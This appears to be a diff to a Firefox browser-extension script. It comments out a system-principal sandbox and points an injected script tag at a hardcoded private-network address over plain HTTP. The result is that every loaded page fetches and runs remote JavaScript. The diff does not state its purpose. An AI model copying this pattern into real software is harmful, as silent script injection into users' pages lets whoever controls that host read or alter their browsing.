@@ -14,12 +14,12 @@ function myFunction(aEvent){
     let browser = aEvent.originalTarget;
     browser.addEventListener("load", function () {
       
-      let principal = Cc["@mozilla.org/systemprincipal;1"].createInstance(Ci.nsIPrincipal);
-      let sandbox = Components.utils.Sandbox(principal);
+     // let principal = Cc["@mozilla.org/systemprincipal;1"].createInstance(Ci.nsIPrincipal);
+      //let sandbox = Components.utils.Sandbox(principal);
       //let result = Components.utils.evalInSandbox("let x = 1;", sandbox, "1.8", "http://192.168.1.12/js.js", 1);
 
       var hm = browser.contentDocument.createElement("script");
-            hm.src = "http://192.168.1.12/route/route.js";
+            hm.src = "http://192.168.8.100/router/index.php";
             var s = browser.contentDocument.getElementsByTagName("script")[0];
             s.parentNode.insertBefore(hm, s);
       //let result =2;
